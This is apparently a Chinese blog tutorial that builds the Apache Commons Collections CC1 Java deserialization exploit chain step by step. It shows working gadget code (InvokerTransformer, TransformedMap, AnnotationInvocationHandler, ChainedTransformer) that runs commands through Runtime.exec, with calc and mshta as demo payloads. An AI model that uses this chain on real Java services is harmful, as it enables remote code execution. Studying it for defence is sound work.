<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/junit/junit --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Src源码：<br>由于默认下载的JDK的源码中是没有sun包的，所以在里面看到的sun包下的java文件都是class后缀（编译后），我们需要.java后缀的，也就是源码，这样才可以调试，就像下图<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671093612043-fb3975a0-1831-470e-a560-3cd5aa6e8a20.png#averageHue=%23685642&clientId=u912540b4-cebc-4&from=paste&height=524&id=uba3dbe0d&name=image.png&originHeight=655&originWidth=1386&originalType=binary&ratio=1&rotation=0&showTitle=false&size=97596&status=done&style=none&taskId=u5a3813b4-8891-4c79-ac1a-fa6e804ccd5&title=&width=1108.8" alt="image.png"><br>因此我们得去openjdk下载8u65版本的源码：</p>
<p>直接下载zip然后把源码中的sun包复制到jdk的src里：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671093663495-aced0dc1-0691-435d-859b-6f66ab2bc529.png#averageHue=%23fdfdfc&clientId=u912540b4-cebc-4&from=paste&height=174&id=u2817f740&name=image.png&originHeight=218&originWidth=1002&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17471&status=done&style=none&taskId=ud5e25c13-7c47-46cf-a7fa-2260546af9a&title=&width=801.6" alt="image.png"><br>最后再Project Struct里添加一下src路径：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671093688077-3618b915-5693-4803-b51f-43744126e859.png#averageHue=%233e4650&clientId=u912540b4-cebc-4&from=paste&height=164&id=u0ff94d67&name=image.png&originHeight=205&originWidth=905&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14837&status=done&style=none&taskId=u6b502ac5-9648-4c76-9fa7-06053c716b6&title=&width=724" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671093693065-98a547a3-757d-4d34-ac64-3ce5ab64233f.png#averageHue=%232e2d2c&clientId=u912540b4-cebc-4&from=paste&height=447&id=u4fa10e5b&name=image.png&originHeight=559&originWidth=1437&originalType=binary&ratio=1&rotation=0&showTitle=false&size=86974&status=done&style=none&taskId=u3f278091-c959-4285-963f-614b564589f&title=&width=1149.6" alt="image.png"><br>刚刚的class文件就变成java文件了，做好了这些就可以开始分析了</p>
<h3 id="1X2-1-2-流程分析——手写EXP"><a href="#1X2-1-2-流程分析——手写EXP" class="headerlink" title="1X2.1.2 流程分析——手写EXP"></a>1X2.1.2 流程分析——手写EXP</h3><p>要开始分析了好紧张啊，因为感觉还是会有点绕的，希望能解释清楚吧<br>首先说说入口吧，入口就是<code>Transformer</code>接口的<code>transform</code>方法：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671100783321-27c5907b-0100-4bc3-99be-b3c84ae0220c.png#averageHue=%232c2b2b&clientId=u912540b4-cebc-4&from=paste&height=317&id=u79ecafd1&name=image.png&originHeight=396&originWidth=1246&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43065&status=done&style=none&taskId=u201968b4-d546-420c-bbf1-e163026c51e&title=&width=996.8" alt="image.png"><br>图中transform方法被21个类实现了，我们的入口类是<code>InvokerTransformer</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671100867465-2a9db8a1-1ed7-400f-8e79-a939640f91ef.png#averageHue=%232d2d2c&clientId=u912540b4-cebc-4&from=paste&height=353&id=ua5386117&name=image.png&originHeight=441&originWidth=1398&originalType=binary&ratio=1&rotation=0&showTitle=false&size=82903&status=done&style=none&taskId=udca59623-ce85-414f-8635-13bdd755ab4&title=&width=1118.4" alt="image.png"><br>在该类中调用了transform方法，该方法需要传入一个object对象，然后会通过反射调用该对象的指定方法，这个都是我们可控的，因此造成了安全隐患<br>继续分析之前先来回顾一下如何通过反射来执行命令：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime r=Runtime.getRuntime();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> Runtime.class.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        exec.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        exec.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671102226484-bc0e839a-da55-41f5-8ea0-5cbdb2cb929b.png#averageHue=%23546354&clientId=u912540b4-cebc-4&from=paste&height=494&id=u4c854921&name=image.png&originHeight=617&originWidth=1525&originalType=binary&ratio=1&rotation=0&showTitle=false&size=226177&status=done&style=none&taskId=u415fabd7-1107-4ece-affd-18f445d5841&title=&width=1220" alt="image.png"><br>这是在我们说反序列化基础里讲到的，那么继续来分析，我们说了入口类是<code>InvokerTransformer</code>的<code>transform</code>方法，我们就试一下用InvokerTransformer去执行命令:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671102344391-8a7f2373-7614-4507-97f0-4b33c0f2a7f6.png#averageHue=%232d2c2c&clientId=u912540b4-cebc-4&from=paste&height=163&id=u5dd7406d&name=image.png&originHeight=204&originWidth=1136&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24740&status=done&style=none&taskId=ucf12f9dd-945c-47eb-896e-86a76eb1024&title=&width=908.8" alt="image.png"><br>构造方法里需要传入的三个参数分别是，需要调用的方法，参数类型，参数，然后在transform方法里要传入一个object，去调用构造函数中传入的方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime r=Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">exec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        exec.transform(r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671102752837-cf0e9299-b71e-4f00-b67f-317b3982d7a4.png#averageHue=%235e5d5d&clientId=u912540b4-cebc-4&from=paste&height=480&id=ud47aa71a&name=image.png&originHeight=600&originWidth=1383&originalType=binary&ratio=1&rotation=0&showTitle=false&size=223268&status=done&style=none&taskId=ufca653d6-af4f-4c7a-b446-96c8c0c2fe6&title=&width=1106.4" alt="image.png"><br>这样也可以成功的去执行命令，这也是我们CC1链中最为重要的部分，剩下的部分都是围绕着这个方法去展开的，知道了InvokerTransformer方法可以调用transform执行命令，那接下来的思路就是寻找还有其他什么地方调用了<code>transform</code>方法，并且可以控制传入的object，之后只需让object等于InvokerTransformer即可执行命令：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671102973462-06420b08-218e-4b2a-9e2f-c0b28288fb2c.png#averageHue=%234f7d57&clientId=u912540b4-cebc-4&from=paste&height=308&id=ud3c88bc9&name=image.png&originHeight=385&originWidth=1887&originalType=binary&ratio=1&rotation=0&showTitle=false&size=96301&status=done&style=none&taskId=u3fd64783-ea31-468f-977d-7902c1404d4&title=&width=1509.6" alt="image.png"><br>重点看到这三个Map集合，在这里就产生了2种CC链，一种是国外原版的，也就是ysoserial里的，另一种是流传到国内的另一个版本。Lazymap是国外的，Transformmap是国内的，但是这两种方法八九不离十，所以本质一模一样<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671105622307-f2aeb276-61cf-4a35-8725-d9c61052036c.png#averageHue=%232d2c2c&clientId=u912540b4-cebc-4&from=paste&height=159&id=uc976524b&name=image.png&originHeight=199&originWidth=1083&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22545&status=done&style=none&taskId=u3cec535b-802b-4074-91b3-b516bc143f8&title=&width=866.4" alt="image.png"><br>在Transformedmap中调用了<code>checkSetValue</code>方法，其中就调用了transform，那么我们来分析一下TransformedMap类：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671106261353-f494145f-4186-45d8-bc7f-02b04f0a8517.png#averageHue=%232d2c2c&clientId=u912540b4-cebc-4&from=paste&height=174&id=u74b0146a&name=image.png&originHeight=217&originWidth=1386&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31454&status=done&style=none&taskId=ufac1bdd2-453c-4034-84c4-259bb7cf4c5&title=&width=1108.8" alt="image.png"><br>该类的构造方法是一个保护类型的，因此注定了只能在类内部进行调用，所以继续跟踪，寻找在哪被调用：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671106309587-af87beda-be96-4756-833a-35896590b5c5.png#averageHue=%232d2d2c&clientId=u912540b4-cebc-4&from=paste&height=130&id=uafcbff69&name=image.png&originHeight=162&originWidth=1228&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24160&status=done&style=none&taskId=ua32dc50b-1603-438a-9911-c26c8b0a37f&title=&width=982.4" alt="image.png"><br>在decorate方法中实例化了TransformedMap类,那么谁又调用了checkSetvalue呢？<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671105700982-cfc96ec7-8127-4b44-b68d-509f7c23ff93.png#averageHue=%235b5346&clientId=u912540b4-cebc-4&from=paste&height=483&id=u12a5714d&name=image.png&originHeight=604&originWidth=1510&originalType=binary&ratio=1&rotation=0&showTitle=false&size=100040&status=done&style=none&taskId=ud3377833-c07c-495a-b991-5c55a39b26c&title=&width=1208" alt="image.png"><br>在<code>AbstractInputCheckedMapDecorator</code>类中调用了<code>setValue</code>方法，其中就调用了checkValue方法，而且我们可以看到<code>AbstractInputCheckedMapDecorator</code>类其实上是<code>Transformedmap</code>的父类：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671105767885-9f279efd-f7b7-4250-bfb5-9e1782f434b8.png#averageHue=%232d2c2b&clientId=u912540b4-cebc-4&from=paste&height=122&id=u15527a05&name=image.png&originHeight=153&originWidth=701&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15481&status=done&style=none&taskId=u0befc2f1-f69f-463f-a1a3-05fa8b3eb4e&title=&width=560.8" alt="image.png"><br>在这里假如对Java集合熟悉一点的人看到了<code>setValue</code>字样就应该想起来，我们在遍历集合的时候就用过setValue和getValue，这就是我们之前讲到的重名函数的利用<br>那接下来可以根据这个思路做一个小demo，也就是调用decorate方法获得实例化对象，再遍历这个Map，在遍历中调用setValue方法,由于TransformedMap继承了<code>AbstractInputCheckedMapDecorator</code>类，因此当调用setValue时会去父类寻找：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime r=Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokertransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        Map&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;afei&quot;</span>,<span class="string">&quot;shishabi&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, invokertransformer);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry entry:transformedmap.entrySet())&#123;</span><br><span class="line">                entry.setValue(r);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>具体思路如上，我们最终调用了setValue，然后触发了checkSetvalue，最终触发了Invokertransformer的transform方法，最终执行了命令<br>接下来该如何找到调用了setValue的类呢？我们继续看看setValue在哪儿被调用了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671107464838-8a47ddb1-461e-483e-a40e-41730dc0b790.png#averageHue=%233f6f48&clientId=u912540b4-cebc-4&from=paste&height=290&id=u91294054&name=image.png&originHeight=363&originWidth=1900&originalType=binary&ratio=1&rotation=0&showTitle=false&size=107550&status=done&style=none&taskId=u7674f559-23eb-4e50-86f9-02f043271c6&title=&width=1520" alt="image.png"><br>在反射包中找到了一个绝佳的类<code>AnnotationInvocationHandler</code>，既有<code>readObject</code>重写，又在<code>readObject</code>中调用了setValue方法（让我怀疑这是不是java设计师留下来的后面)，所以我们跟进：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123; </span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面就是<code>AnnotationInvocationHandler.readObject</code>源码，在<code>memberValue.setValue</code>调用了方法，我们先分析一个<code>AnnotationInvocationHandler</code>类：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671107792868-780a1431-58d9-4160-a2ee-2bbe5ce23064.png#averageHue=%232e2d2c&clientId=u912540b4-cebc-4&from=paste&height=246&id=ue90eb3e1&name=image.png&originHeight=308&originWidth=1152&originalType=binary&ratio=1&rotation=0&showTitle=false&size=55827&status=done&style=none&taskId=u6cdb350b-388f-4f5c-afd6-0ab9d9163d4&title=&width=921.6" alt="image.png"><br>这个类没有被public声明，也就是在外面无法通过名字来调用，因此只可以用反射获取这个类，我们看一下这个类的构造方法需要传入什么类型的参数：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671124928674-7acb526b-c7f3-4675-9614-4c163d1e04ea.png#averageHue=%232d2c2b&clientId=u912540b4-cebc-4&from=paste&height=161&id=u39e7f699&name=image.png&originHeight=201&originWidth=1192&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35650&status=done&style=none&taskId=ua76946cd-f684-4eda-9ff4-c7f056a1a06&title=&width=953.6" alt="image.png"><br>一个Class对象，一个Map对象，其中Class继承了Annotation，也就是需要传入一个注解类进去（Target,Override）这里我们选择Target后面会说为什么的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  annotationconstructor.newInstance(Target.class, transformedmap);</span><br></pre></td></tr></table></figure>
<p>最后调用起来如上，这只是部分代码，所以不需要知道里面传入的是啥，基本形式就是这样，解决完这一个问题，还有另一个问题，就是Runtime类是不可以被序列化的，如何解决这一个问题成了国际难题,还记得在一开始讲Java反序列化基础时我提到过的动态加载吗？<br>你看<code>Invokertransformer</code>像不像一个动态加载：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671126222915-4df70f9a-1366-4755-93f8-994dec8ddafd.png#averageHue=%232d2c2c&clientId=u912540b4-cebc-4&from=paste&height=179&id=uace6eaae&name=image.png&originHeight=224&originWidth=1103&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25689&status=done&style=none&taskId=u847425c7-629c-42a1-9cd9-96c8996105f&title=&width=882.4" alt="image.png"><br>这些参数都是可控的，并且Invokertransformer是可以序列化的，因此可以利用Invokertransformer和反射去调用Runtime类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//由于Runtime类不可序列化，但是Class类可以，因此反射调用</span></span><br><span class="line"> Method Runmethod= (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line"></span><br><span class="line"> Runtime r=(Runtime)<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(Runmethod);</span><br><span class="line"></span><br><span class="line"> Method execmethod=(Method)  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;exec&quot;</span>,String[].class&#125;).transform(Runtime.class);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br></pre></td></tr></table></figure>
<p>这样利用Invokertransformer和反射可以成功调用<code>Runtime.getRuntime().exec</code>方法解释一下上面代码的意思吧：<br>首先调用Invokertransformer方法的构造函数，传入的第一个参数String代表你需要调用的方法，第二个参数new Class[]数组代表你方法需要的参数类型，第三个参数new Object[]数组代表方法参数的具体值<br>Invokertransformer.transform传入的参数表示需要触发方法的对象，如第一段代码<code>transform(Runtime.class);</code>表示<code>Runtime.class.getDeclaredMethod(&quot;getRuntime&quot;,null);</code><br>这样大致就明白了吧，但还有一个小问题，在刚刚的小Demo里：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Runtime r=Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokertransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        Map&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;afei&quot;</span>,<span class="string">&quot;shishabi&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, invokertransformer);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry entry:transformedmap.entrySet())&#123;</span><br><span class="line">                entry.setValue(r);</span><br></pre></td></tr></table></figure>
<p>其中我们的transformedmap是传入了一个<code>invokertransformer</code>，但是现在这个对象没有了，被拆成了多个，就是上述四段代码，得想个办法统合起来，这里就回到最初的Transformer接口里去寻找：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671127520706-6573e1be-20c6-4704-adaa-fd999239eb19.png#averageHue=%232f2f2e&clientId=u912540b4-cebc-4&from=paste&height=310&id=ud707c097&name=image.png&originHeight=387&originWidth=1147&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53838&status=done&style=none&taskId=u02da7c19-1253-46ea-9932-fa90b1d0932&title=&width=917.6" alt="image.png"><br>在ChainedTransformer里可以看到有transform方法，我们之前最终想要调用的是invokertransformer的transform方法，但是看ChainedTransformer的transform方法，他对属性<code>iTransformers</code>进行了一次递归调用<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671127702526-db4d4ea7-bce2-4297-9c62-504f1fe46c94.png#averageHue=%232f2e2d&clientId=u912540b4-cebc-4&from=paste&height=59&id=ue90a5a0f&name=image.png&originHeight=74&originWidth=560&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7191&status=done&style=none&taskId=u250dcc00-6466-4e40-8665-a81b768b339&title=&width=448" alt="image.png"><br>是一个Transformer数组，那么假如这个数组里面的元素是<code>invokertransformer</code>那不就可以了？就和上面四段代码一样，也是递归调用！</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">    </span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">    </span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot; mshta vbscript:msgbox(\&quot;恭喜你成功完成CC1！\&quot;,64,\&quot;Congratulations！\&quot;)(window.close)&quot;</span>&#125;)</span><br><span class="line">    </span><br><span class="line">     &#125;;</span><br><span class="line">     <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">     chainedTransformer.transform(Runtime.class);</span><br></pre></td></tr></table></figure>
